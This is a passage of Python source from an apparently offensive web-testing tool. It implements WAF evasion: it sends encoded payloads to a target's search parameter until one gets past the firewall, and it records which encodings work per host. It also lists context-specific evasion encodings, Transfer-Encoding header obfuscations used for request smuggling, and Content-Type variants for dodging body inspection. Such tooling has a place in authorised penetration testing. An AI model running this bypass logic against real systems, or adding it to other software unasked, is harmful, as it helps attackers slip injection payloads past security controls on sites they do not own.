        """Get techniques that worked for a specific host."""
        return list(self._working_techniques.get(host, []))

    def get_best_encoding(self, host: str, payload: str) -> str:
        """Get best encoding for a host based on learned data."""
        working = self._working_techniques.get(host, [])
        if working:
            # Use first known working technique
            fn = ENCODING_FUNCTIONS.get(working[0])
            if fn:
                try:
                    return fn(payload)
                except Exception:
                    pass

        # Fallback to first profile encoding
        if self._profile and self._profile.effective_encodings:
            fn = ENCODING_FUNCTIONS.get(self._profile.effective_encodings[0])
            if fn:
                try:
                    return fn(payload)
                except Exception:
                    pass

        return payload

    async def test_bypass(
        self,
        ctx: Any,
        base_url: str,
        payload: str,
        *,
        host: str = "",
        param: str = "q",
    ) -> BypassResult:
        """Test bypass techniques iteratively against a target.

        Sends payload with each encoding technique until one passes through.
        Records results for future use.

        Args:
            ctx: PluginContext with http and rate
            base_url: Base URL of target
            payload: Raw payload to test
            host: Target host for recording results
            param: Query parameter to inject into
        """
        best = BypassResult(original=payload, encoded=payload, technique="none")

        # First test raw payload to establish baseline (should be blocked)
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    f"{base_url}/search?{param}={quote(payload)}", timeout=8.0,
                )
                if resp.status < 400:
                    # Not blocked — no WAF or WAF allows this
                    best.passed = True
                    best.status = resp.status
                    best.technique = "raw"
                    return best
                best.status = resp.status
        except Exception:
            return best

        # Try each encoding technique
        variants = self.encode_with_headers(payload)
        for encoded, headers in variants:
            if encoded == payload and not headers:
                continue  # Skip raw which we already tested

            try:
                url = f"{base_url}/search?{param}={quote(encoded, safe='')}"
                async with ctx.rate:
                    resp = await ctx.http.get(
                        url, headers=headers or None, timeout=8.0,
                    )
                    if resp.status < 400:
                        technique = "unknown"
                        # Find which technique produced this encoding
                        for name, fn in ENCODING_FUNCTIONS.items():
                            try:
                                if fn(payload) == encoded:
                                    technique = name
                                    break
                            except Exception:
                                continue

                        best = BypassResult(
                            original=payload,
                            encoded=encoded,
                            technique=technique,
                            passed=True,
                            status=resp.status,
                            waf_name=self._waf_name,
                        )
                        if host:
                            self.record_success(host, technique)
                        return best
                    elif host:
                        # Record failure for learning
                        for name, fn in ENCODING_FUNCTIONS.items():
                            try:
                                if fn(payload) == encoded:
                                    self.record_failure(host, name)
                                    break
                            except Exception:
                                continue
            except Exception:
                continue

        return best

    def encode_for_context(
        self,
        payload: str,
        context: str = "query",
    ) -> list[str]:
        """Context-aware encoding — select techniques appropriate for injection point.

        Args:
            payload: Raw payload to encode.
            context: One of "query", "json_body", "xml_body", "header", "path".
        """
        context_techniques: dict[str, list[str]] = {
            "query": [
                "double_encode", "case_swap", "comment_split",
                "unicode_normalize", "null_byte", "hpp",
            ],
            "json_body": [
                "json_unicode_keys", "json_unicode_escape",
                "json_scientific_numbers", "json_duplicate_keys",
                "json_comment_injection",
            ],
            "xml_body": [
                "html_entity_encode", "hex_entity_encode",
                "unicode_normalize",
            ],
            "header": [
                "header_case_variation", "unicode_normalize",
                "double_encode",
            ],
            "path": [
                "double_slash", "matrix_params", "path_normalization",
                "trailing_dot", "overlong_utf8", "double_encode",
            ],
        }

        techniques = context_techniques.get(context, list(ENCODING_FUNCTIONS.keys()))

        # If WAF profile is set, also include profile-effective techniques
        if self._profile:
            effective = set(self._profile.effective_encodings)
            ctx_set = set(context_techniques.get(context, []))
            techniques = [t for t in techniques if t in effective or t in ctx_set]

        variants: list[str] = [payload]
        seen: set[str] = {payload}
        for technique in techniques:
            fn = ENCODING_FUNCTIONS.get(technique)
            if fn is None:
                continue
            try:
                encoded = fn(payload)
                if encoded and encoded not in seen:
                    seen.add(encoded)
                    variants.append(encoded)
            except Exception:
                continue
        return variants

    def get_te_bypass_headers(self) -> list[dict[str, str]]:
        """Transfer-Encoding header variations for protocol-level WAF bypass."""
        return [
            {"Transfer-Encoding": "chunked"},
            {"Transfer-Encoding": " chunked"},
            {"Transfer-Encoding": "chunked\t"},
            {"Transfer-Encoding": "identity, chunked"},
            {"Transfer-Encoding": "chunked, identity"},
            {"Transfer-encoding": "chunked"},
            {"Transfer-Encoding": "CHUNKED"},
            {"Transfer-Encoding": "\tchunked"},
            {"Transfer-Encoding": "chunked;ext=value"},
        ]

    def get_content_type_bypasses(self, original_ct: str) -> list[str]:
        """Content-Type variations to avoid WAF body inspection."""
        if "json" in original_ct:
            return [
                "application/json",
                "application/json; charset=utf-8",
                "application/csp-report",
                "application/x-json",
                "text/json",
                "text/x-json",
                "application/vnd.api+json",
            ]
        if "form" in original_ct:
            return [
                "application/x-www-form-urlencoded",
                "application/x-www-form-urlencoded; charset=utf-8",
                "multipart/form-data; boundary=----basilisk",
            ]
        return [original_ct]


# Type alias for type hints in other modules
from typing import Any  # noqa: E402
